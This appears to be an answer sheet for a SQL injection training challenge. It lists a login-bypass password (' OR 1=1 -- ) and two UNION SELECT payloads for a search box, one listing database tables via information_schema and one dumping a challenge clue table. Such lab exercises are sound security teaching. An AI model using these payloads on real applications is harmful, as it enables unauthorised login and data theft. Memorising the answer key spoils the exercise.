# Solution to the SQL injection challenge

## Login
**Username:** <code>admin</code>  
**Password:** <code>' OR 1=1 -- </code> (include the space at the end)

## Search Box – Get table names
**Search Input:** <code>' UNION ALL SELECT table_name, 1, 1 FROM information_schema.tables WHERE table_schema=database() -- </code> (include the space at the end)

## Search Box – Get challenge clue
**Search Input:** <code>' UNION ALL SELECT *, 1 FROM challenge_clue -- </code> (include the space at the end)